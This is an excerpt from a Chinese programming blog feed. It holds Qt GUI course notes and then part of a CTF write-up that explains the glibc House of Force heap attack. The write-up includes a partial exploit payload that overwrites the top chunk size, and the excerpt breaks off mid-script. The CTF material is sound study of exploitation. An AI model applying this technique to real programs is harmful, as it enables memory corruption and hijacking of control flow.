MyPushButton(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;recv1 = <span class="keyword">new</span> recv;</span><br><span class="line">        btn-&gt;show();</span><br><span class="line">        btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">        btn-&gt;setText(<span class="string">"我的按钮"</span>);</span><br><span class="line">        btn-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals);</span><br><span class="line">        plz();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::plz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    emit btn-&gt;rang();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-重载信号和槽"><a href="#2-重载信号和槽" class="headerlink" title="2.重载信号和槽"></a>2.重载信号和槽</h3><p>接着上个案例</p><p><strong>重载信号 重载槽 重新定义槽函数</strong> </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">(QString)</span></span>;</span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">(QString s)</span></span>;</span><br><span class="line"><span class="comment">//recv.p</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">(QString second)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"接受成功响铃"</span> &lt;&lt; second &lt;&lt; <span class="string">"秒"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于连接无法分清函数地址，这里用<strong>函数指针来体现函数地址</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单说一下函数指针</span></span><br><span class="line"><span class="comment">//返回类型为空 第一个括号里为指针 第二个括号为参数 =后面是需要指向函数的地址</span></span><br><span class="line"><span class="keyword">void</span>(recv:: *recvslot)(QString) = &amp;recv::recvsignals;</span><br><span class="line"><span class="keyword">void</span>(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;</span><br><span class="line"><span class="built_in">connect</span>(btn, ButtonSignal, recv1, recvslot);</span><br><span class="line">plz();</span><br></pre></td></tr></table></figure><p>成功实现</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207233628350.png" alt="image-20201207233628350"></p><blockquote><p>Qstring怎么去掉引号</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;second.toUtf8().data()</span><br></pre></td></tr></table></figure></blockquote><h3 id="3-信号和槽的拓展"><a href="#3-信号和槽的拓展" class="headerlink" title="3.信号和槽的拓展"></a>3.信号和槽的拓展</h3><ul><li>信号可以连接信号</li><li>一个信号可以连接多个槽函数</li><li>多个信号可以连接同一个槽函数</li><li><strong>信号和槽函数的类型必须一一对应</strong></li><li>信号的参数个数可以大于槽函数的参数个数</li></ul><h4 id="信号连接信号"><a href="#信号连接信号" class="headerlink" title="信号连接信号"></a>信号连接信号</h4><p>继续下一个</p><p><strong>我们按下按钮1才会响铃</strong></p><p>这里用两种实现</p><ol><li>点击连接plz函数</li><li><strong>点击连接响铃信号</strong>,此时函数中无参数</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"响铃"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,<span class="keyword">this</span>,&amp;Widget::plz);</span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">    QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"响铃"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,btn,ButtonSignal);</span><br></pre></td></tr></table></figure><p>效果图如下</p><p>方法1</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208162609069.png" alt="image-20201208162609069"></p><p>方法2</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208163512899.png" alt="image-20201208163512899"></p><h3 id="4-Lambda表达式"><a href="#4-Lambda表达式" class="headerlink" title="4.Lambda表达式"></a>4.Lambda表达式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[=]()&#123;</span><br><span class="line">btn1-&gt;setText(<span class="string">"第二个"</span>);</span><br><span class="line">&#125;();  <span class="comment">//()调用</span></span><br><span class="line"><span class="comment">//[]必须存在 不可省略</span></span><br><span class="line"><span class="comment">//()重载函数的参数</span></span><br><span class="line"><span class="comment">//= 值传递</span></span><br><span class="line"><span class="comment">//&amp; 引用传递</span></span><br><span class="line"><span class="comment">//a 只对a传递</span></span><br><span class="line"><span class="comment">//&amp;a 只对引用a传递</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对于想要值修改，需要mutable关键字,但不改变本体</span></span><br><span class="line">[=]()<span class="keyword">mutable</span>&#123;m = <span class="number">100</span> + <span class="number">10</span>;</span><br><span class="line">            qDebug &lt;&lt; m;&#125;();</span><br><span class="line"><span class="comment">//返回值 -&gt;返回值类型</span></span><br><span class="line"><span class="keyword">int</span> ret = []()-&gt;<span class="keyword">int</span>&#123;<span class="keyword">return</span> <span class="number">1000</span>;&#125;();</span><br></pre></td></tr></table></figure><h2 id="0x04-QMainWindow"><a href="#0x04-QMainWindow" class="headerlink" title="0x04 QMainWindow"></a>0x04 QMainWindow</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208225426943.png" alt="image-20201208225426943"></p><h3 id="1-菜单栏"><a href="#1-菜单栏" class="headerlink" title="1.菜单栏"></a>1.菜单栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//菜单栏</span></span><br><span class="line"><span class="comment">//菜单栏最多有一个</span></span><br><span class="line"><span class="comment">//创建菜单栏</span></span><br><span class="line">QMenuBar * bar = menuBar();</span><br><span class="line"><span class="comment">//将菜单栏放入到窗口中</span></span><br><span class="line">setMenuBar(bar);</span><br><span class="line"><span class="comment">//创建菜单</span></span><br><span class="line">QMenu * fileMenu = bar-&gt;addMenu(<span class="string">"文件"</span>);</span><br><span class="line">QMenu * editMenu = bar-&gt;addMenu(<span class="string">"编辑"</span>);</span><br><span class="line"><span class="comment">//创建菜单项</span></span><br><span class="line"><span class="comment">//fileMenu-&gt;addAction("新建");</span></span><br><span class="line">QAction * action1 = fileMenu-&gt;addAction(<span class="string">"新建"</span>);</span><br><span class="line"><span class="comment">//添加分隔符</span></span><br><span class="line">fileMenu-&gt;addSeparator();</span><br><span class="line">QAction * action2 = fileMenu-&gt;addAction(<span class="string">"打开"</span>);</span><br></pre></td></tr></table></figure><h3 id="2-工具栏"><a href="#2-工具栏" class="headerlink" title="2.工具栏"></a>2.工具栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//工具栏</span></span><br><span class="line"><span class="comment">//工具栏 可以有多个</span></span><br><span class="line">QToolBar * toolBar = <span class="keyword">new</span> QToolBar(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//工具栏区域</span></span><br><span class="line">addToolBar(Qt::LeftToolBarArea,toolBar);</span><br><span class="line"><span class="comment">//设置工具栏区域 只允许左右停靠</span></span><br><span class="line">toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);</span><br><span class="line"><span class="comment">//设置浮动</span></span><br><span class="line">toolBar-&gt;setFloatable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//设置移动</span></span><br><span class="line">toolBar-&gt;setMovable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//设置内容</span></span><br><span class="line"><span class="comment">//toolBar-&gt;addAction("新建");</span></span><br><span class="line">toolBar-&gt;addAction(action1);</span><br><span class="line"><span class="comment">//添加分割线</span></span><br><span class="line">toolBar-&gt;addSeparator();</span><br><span class="line">toolBar-&gt;addAction(action2);</span><br><span class="line"><span class="comment">//工具栏添加控件</span></span><br><span class="line">QPushButton *btn = <span class="keyword">new</span> QPushButton(<span class="string">"点这里"</span>,<span class="keyword">this</span>);</span><br><span class="line">toolBar-&gt;addWidget(btn);</span><br></pre></td></tr></table></figure><h3 id="3-状态栏"><a href="#3-状态栏" class="headerlink" title="3.状态栏"></a>3.状态栏</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//状态栏</span></span><br><span class="line"><span class="comment">//状态栏可以有多个</span></span><br><span class="line">QStatusBar * stBar = statusBar();</span><br><span class="line"><span class="comment">//设置到窗口</span></span><br><span class="line">setStatusBar(stBar);</span><br><span class="line"><span class="comment">//添加标签控件</span></span><br><span class="line"><span class="comment">//左侧提示</span></span><br><span class="line">QLabel * label = <span class="keyword">new</span> QLabel(<span class="string">"左侧信息"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addWidget(label);</span><br><span class="line"><span class="comment">//右侧提示</span></span><br><span class="line">QLabel * label1 = <span class="keyword">new</span> QLabel(<span class="string">"右侧信息"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addPermanentWidget(label1);</span><br></pre></td></tr></table></figure><h3 id="4-浮动窗口"><a href="#4-浮动窗口" class="headerlink" title="4.浮动窗口"></a>4.浮动窗口</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//铆接部件(浮动窗口)</span></span><br><span class="line"><span class="comment">//铆接部件 可以有多个</span></span><br><span class="line">QDockWidget * dock = <span class="keyword">new</span> QDockWidget(<span class="string">"浮动"</span>,<span class="keyword">this</span>);</span><br><span class="line">addDockWidget(Qt::BottomDockWidgetArea,dock);</span><br><span class="line"><span class="comment">//设置停靠区域</span></span><br><span class="line">dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea);</span><br></pre></td></tr></table></figure><h3 id="5-核心部件"><a href="#5-核心部件" class="headerlink" title="5.核心部件"></a>5.核心部件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置中心部件(只能有一个)</span></span><br><span class="line">QTextEdit * edit = <span class="keyword">new</span> QTextEdit(<span class="keyword">this</span>);</span><br><span class="line">setCentralWidget(edit);</span><br></pre></td></tr></table></figure><h2 id="0x05-资源文件"><a href="#0x05-资源文件" class="headerlink" title="0x05 资源文件"></a>0x05 资源文件</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201209001543539.png" alt="image-20201209001543539"></p><h2 id="0x06-对话框"><a href="#0x06-对话框" class="headerlink" title="0x06 对话框"></a>0x06 对话框</h2><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//新建按钮 弹出对话框</span></span><br><span class="line">    <span class="built_in">connect</span>(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123;</span><br><span class="line">        <span class="comment">//模态对话框 （不可以对其它窗口进行操作）</span></span><br><span class="line">        <span class="comment">//非模态对话框 （可以对其他窗口进行操作）</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//模态对话框的创建</span></span><br><span class="line">        QDialog dlg(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//对话框的大小</span></span><br><span class="line">        dlg.resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//对话框阻塞</span></span><br><span class="line">        dlg.exec();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//非模态对话框</span></span><br><span class="line">        QDialog *dlg2 = <span class="keyword">new</span> QDialog(<span class="keyword">this</span>);</span><br><span class="line">        dlg2-&gt;resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        dlg2-&gt;show();</span><br><span class="line">        <span class="comment">//关闭释放内存</span></span><br><span class="line">        dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="2-标准对话框"><a href="#2-标准对话框" class="headerlink" title="2.标准对话框"></a>2.标准对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//消息对话框</span></span><br><span class="line"><span class="comment">//错误对话框</span></span><br><span class="line"><span class="comment">//QMessageBox::critical(this,"错误","错误");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//信息对话框</span></span><br><span class="line"><span class="comment">//QMessageBox::information(this,"消息","消息");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//提问对话框</span></span><br><span class="line"><span class="comment">//参数1 父亲 参数2 标题 参数3 提示内容 参数4 按键类型</span></span><br><span class="line">QMessageBox::question(<span class="keyword">this</span>,<span class="string">"提问"</span>,<span class="string">"提问"</span>,QMessageBox::Save|QMessageBox::Cancel);</span><br><span class="line"><span class="keyword">if</span>(QMessageBox::Save==QMessageBox::question(<span class="keyword">this</span>,<span class="string">"提问"</span>,<span class="string">"提问"</span>,QMessageBox::Save|QMessageBox::Cancel))&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"保存"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-其他对话框"><a href="#3-其他对话框" class="headerlink" title="3.其他对话框"></a>3.其他对话框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//颜色对话框</span></span><br><span class="line"><span class="comment">//QColor color = QColorDialog::getColor(QColor(255,0,0));</span></span><br><span class="line"><span class="comment">//文件对话框</span></span><br><span class="line"><span class="comment">//参数1 父亲 参数2 标题 参数3 目录 参数4 文件格式</span></span><br><span class="line"><span class="comment">//QString str = QFileDialog::getOpenFileName(this,"打开","c://","(*.txt)");</span></span><br><span class="line"><span class="comment">//字体对话框</span></span><br><span class="line"><span class="keyword">bool</span> flag;</span><br><span class="line">QFontDialog::getFont(&amp;flag,QFont(<span class="string">"华文彩云"</span>,<span class="number">36</span>));</span><br></pre></td></tr></table></figure><h2 id="0x07-界面布局"><a href="#0x07-界面布局" class="headerlink" title="0x07 界面布局"></a>0x07 界面布局</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210092318304.png" alt="image-20201210092318304"></p><h2 id="0x08-控件"><a href="#0x08-控件" class="headerlink" title="0x08 控件"></a>0x08 控件</h2><h3 id="1-按钮"><a href="#1-按钮" class="headerlink" title="1.按钮"></a>1.按钮</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210100503686.png" alt="image-20201210100503686"></p><h3 id="2-树控件"><a href="#2-树控件" class="headerlink" title="2.树控件"></a>2.树控件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//树控件的使用</span></span><br><span class="line"><span class="comment">//水平头</span></span><br><span class="line">ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; <span class="string">"英雄"</span> &lt;&lt; <span class="string">"英雄介绍"</span>);</span><br><span class="line"><span class="comment">//加载顶层的节点</span></span><br><span class="line">QTreeWidgetItem * liitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"力量"</span>);</span><br><span class="line">QTreeWidgetItem * spitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"速度"</span>);</span><br><span class="line">QTreeWidgetItem * faitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"法力"</span>);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(faitem);</span><br></pre></td></tr></table></figure><h3 id="3-table控件"><a href="#3-table控件" class="headerlink" title="3.table控件"></a>3.table控件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//table控件</span></span><br><span class="line">    <span class="comment">//设置列数</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setColumnCount(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//设置水平表头</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;<span class="string">"姓名"</span> &lt;&lt;<span class="string">"性别"</span> &lt;&lt; <span class="string">"年龄"</span>);</span><br><span class="line">    <span class="comment">//设置行数</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setRowCount(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">//设置正文</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setItem(<span class="number">0</span>,<span class="number">0</span>,<span class="keyword">new</span> QTableWidgetItem(<span class="string">"压缩"</span>));</span><br><span class="line">    <span class="comment">//列表</span></span><br><span class="line">    QList&lt;QString&gt; namelist;</span><br><span class="line">    QStringList sexlist;</span><br><span class="line">    sexlist &lt;&lt; <span class="string">"男"</span> &lt;&lt; <span class="string">"男"</span> &lt;&lt; <span class="string">"男"</span>  &lt;&lt; <span class="string">"男"</span>；</span><br><span class="line">    namelist &lt;&lt; <span class="string">"ll"</span> &lt;&lt; <span class="string">"aa"</span> &lt;&lt; <span class="string">"11"</span>;</span><br></pre></td></tr></table></figure><h3 id="4-其他控件"><a href="#4-其他控件" class="headerlink" title="4.其他控件"></a>4.其他控件</h3><p>需要的时去看库吧</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210104641479.png" alt="image-20201210104641479"></p><h2 id="0x09-Qfile文件读写"><a href="#0x09-Qfile文件读写" class="headerlink" title="0x09 Qfile文件读写"></a>0x09 Qfile文件读写</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083900742.png" alt="image-20201214083900742"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083912652.png" alt="image-20201214083912652"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;程序设计综合实践&quot;&gt;&lt;a href=&quot;#程序设计综合实践&quot; class=&quot;headerlink&quot; title=&quot;程序设计综合实践&quot;&gt;&lt;/a&gt;程序设计综合实践&lt;/h1&gt;&lt;p&gt;图形化编程&lt;/p&gt;
&lt;p&gt;这不同语言分数还不太一样，最后用Qt了&lt;/p&gt;
&lt;p&gt;四个星期四个</summary>
      
    
    
    
    <category term="Qt" scheme="https://pz1o.top/categories/Qt/"/>
    
    
    <category term="Qt" scheme="https://pz1o.top/tags/Qt/"/>
    
    <category term="实验" scheme="https://pz1o.top/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>新生赛复现</title>
    <link href="https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-06T14:22:34.000Z</published>
    <updated>2020-12-23T09:07:46.902Z</updated>
    
    <content type="html"><![CDATA[<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>终于考完试了，这考前学真不是人干的，上课还是得听一听</p><p>复现一下这几道题，顺便学习堆的知识</p><hr><p>淦 我是fw 拖了五天 终于来复现了</p><p>但发现堆已经忘得差不多了</p><p>先复习堆的基础知识</p><p><a href="https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学）" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/category_9150569.html（浅显易懂，非常适合新手学）</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/</a></p><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>官方wp</p><blockquote><p>利用change函数中存在的任意字节堆溢出构造house of force攻击</p><p>关于house of force不懂得的可以参考这篇文章</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p></blockquote><p>先来看一下house of force</p><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a><strong>house of force</strong></h2><p><strong>利用条件</strong></p><ul><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li></ul><p><strong>利用步骤</strong></p><p>(1)首先先泄露出堆地址。</p><p>(2)利用堆溢出，将top chunk的size域修改为很大的数</p><p>(3)申请大块内存(可以通过堆地址和目标地址的距离进行计算)，使得top chunk的头部落在目标地址范围内。</p><p>(4)再次申请内存，那么新申请的内存即为目标地址，通常情况下(未开启FullRelro)，一般是将目标地址设为got表地址。</p><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。</p><p>因为是第一次弄堆题 所以尽量弄得清楚一点</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122054112.png" alt="image-20201213122054112"></p><p>还未进入菜单 堆中情况</p><p>两个指针</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122653935.png" alt="image-20201213122653935"></p><p>添加一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>, <span class="string">"aaaa"</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213140931866.png" alt="image-20201213140931866"></p><p>修改top chunk大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213170620443.png" alt="image-20201213170620443"></p><p>这时 我们需要把top指针指向堆底，从而改变函数指针</p><p>那我们应该怎么申请大小呢，我们需要“后撤步”，就是负向申请地址。那大小呢，最起码应该是0x40+0x20，然后加上一个头需要的地址（0xf）与尾部top前可用的空间（0x8）。</p><p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213175814153.png" alt="image-20201213175814153"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 